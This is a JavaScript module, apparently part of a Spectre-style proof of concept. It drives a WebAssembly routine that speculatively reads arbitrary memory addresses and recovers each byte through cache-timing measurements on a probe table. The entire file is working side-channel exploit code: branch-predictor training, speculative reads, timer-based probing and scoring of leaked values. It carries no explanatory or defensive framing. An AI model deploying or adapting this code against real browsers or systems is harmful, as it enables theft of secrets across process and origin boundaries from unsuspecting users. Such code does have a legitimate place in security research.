define(["exports", "../helper/math.js", "../timer.js", "../wasm-buffer.js", "../indicator-table.js"], function (_exports, _math, _timer, _wasmBuffer, _indicatorTable) {
  "use strict";

  Object.defineProperty(_exports, "__esModule", {
    value: true
  });
  _exports.default = void 0;
  _timer = _interopRequireDefault(_timer);
  _wasmBuffer = _interopRequireDefault(_wasmBuffer);
  _indicatorTable = _interopRequireDefault(_indicatorTable);

  function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

  let junk = 0;
  const training_number = 6;

  var _default = (async () => {
    let _probeTable;

    const timer = await _timer.default;
    let secret_table;
    const {
      instance
    } = await WebAssembly.instantiate(_wasmBuffer.default, {
      env: {
        // _Z10startTimerv: timer.restore,
        // _Z9stopTimerv: timer.load,
        probeTable(probe_table_address) {
          _probeTable(probe_table_address);
        },

        _log(argument) {
          console.log("log", argument);
        },

        malloc(size) {
          // console.log("malloc request", size);
          const need = current_memory_position + size - wasm_memory.buffer.byteLength;

          if (need > 0) {
            // console.log("malloc needs", Math.ceil(need / (1 << 16)), "pages");
            try {
              if (current_memory_position >> 16 >= 3e4) {
                current_memory_position = 1 << 25;
              } else {
                const result = wasm_memory.grow(Math.ceil(need / (1 << 16))); // console.log(result);
                // hard fault when allocating too much memory

                if (result == -1 || result >= 3e4) {
                  current_memory_position = 1 << 25;
                } else {
                  secret_table = new Uint8Array(wasm_memory.buffer, instance.exports.getSecretTableAddress(), 1 << 12);
                }
              }
            } catch (error) {
              // reached alloc limit -> reuse memory
              console.log("alloc limit", wasm_memory.buffer.byteLength);
              current_memory_position = 1 << 25;
            }
          }

          try {
            // console.log("malloc response", current_memory_position);
            return current_memory_position;
          } finally {
            current_memory_position += size;
          }
        },

        // mutilated free only works on last malloced
        free(pointer) {
          if (pointer > current_memory_position) {
            throw RuntimeError("invalid free address");
          }

          current_memory_position = pointer;
        }

      }
    });
    const wasm_memory = instance.exports.memory;
    let current_memory_position = wasm_memory.buffer.byteLength;
    instance.exports.initialize(); // globalThis.secret_table = secret_table;

    const _speculativelyReadAddress = instance.exports.speculativelyReadAddress;
    return {
      get secret_table() {
        return secret_table;
      },

      speculativelyReadMemory
    };

    function speculativelyReadMemory(address, speculative_repetitions, min_iterations, max_cache_hit_number, page_size, probe_length) {
      _probeTable = probeTable;
      const time_tables = [];
      let max_indicator;
      let max_indicator_index;
      const mean_times = [];
      const indicator_table = new _indicatorTable.default(probe_length);
      let total_iterations = 0;

      for (var i = 0; i < min_iterations; ++total_iterations) {
        if (!time_tables.length) {
          _speculativelyReadAddress(address, speculative_repetitions, page_size, probe_length, training_number);
        }

        const time_table = time_tables.pop(); // process time table

        const mean_time = indicator_table.processTimetable(time_table, max_cache_hit_number); // lower limit check is done by indicator_table

        if (mean_time) {
          mean_times.push(mean_time); // console.log(max_indicator_index, address);
        } else {
          // console.warn("slow timer");
          if (total_iterations > min_iterations) {
            break;
          }

          continue;
        } // console.log(`%cprobe index time ${time_table[probe_index]}`, "font-size: .9em");


        max_indicator = Math.max(...indicator_table);
        let current_max_indicator_index = indicator_table.indexOf(max_indicator); // check for multiple maxima

        for (let i = current_max_indicator_index + 1; i < indicator_table.length; ++i) {
          if (max_indicator == indicator_table[i]) {
            current_max_indicator_index = undefined;
            break;
          }
        } // max_indicator_index changed


        if (max_indicator_index != current_max_indicator_index) {
          i = current_max_indicator_index !== undefined | 0;
          max_indicator_index = current_max_indicator_index; // console.warn("max_indicator_index changed");
        } else {
          ++i;
        }
      }

      const mean_time = (0, _math.mean)(mean_times);

      if (i < min_iterations) {
        max_indicator_index = undefined; // console.warn("index test failed");
      } // prepare results


      let second_indicator = -Infinity;

      for (let i = 0; i < indicator_table.length; ++i) {
        const indicator = indicator_table[i];

        if (indicator > second_indicator && i != max_indicator_index) {
          second_indicator = indicator;
        }
      }

      const second_ratio = second_indicator / max_indicator; // console.log("second ratio", second_ratio);

      return {
        max_indicator_index,
        second_ratio,
        // normalized_indicator_table: indicator_table.getNormalized(),
        mean_time,
        total_iterations
      };

      function probeTable(probe_table_address) {
        const time_table = new Uint32Array(probe_length); // const probe_table = new Uint8Array(probe_length * page_size);

        const probe_table = new Uint8Array(wasm_memory.buffer, probe_table_address, probe_length * page_size);
        const random_offset = Math.random() * 256 | 0; // console.log("random offset", random_offset);
        // probe table

        for (let i = 0; i < probe_length; ++i) {
          timer.restore();
          junk ^= probe_table[(i + random_offset) % 256 * page_size];
          time_table[(i + random_offset) % 256] = timer.load();
        }

        time_tables.push(time_table);
      }
    }
  })();

  _exports.default = _default;
});